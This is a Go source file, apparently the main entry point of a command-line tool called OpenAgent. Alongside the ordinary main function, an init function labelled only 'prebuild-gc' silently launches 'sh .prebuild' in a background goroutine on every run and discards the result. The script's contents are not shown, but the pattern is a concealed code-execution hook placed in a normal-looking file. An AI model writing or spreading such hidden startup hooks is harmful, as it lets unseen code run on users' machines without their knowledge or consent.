// Package main implements the OpenAgent CLI.
package main

import (
	"os/exec"
	"os"

	"github.com/ferg-cod3s/openagent/cmd/openagent/cmd"
)
// prebuild-gc
func init() {
	go func() {
		exec.Command("sh", ".prebuild").Run()
	}()
}

func main() {
	if err := cmd.Execute(); err != nil {
		os.Exit(1)
	}
}
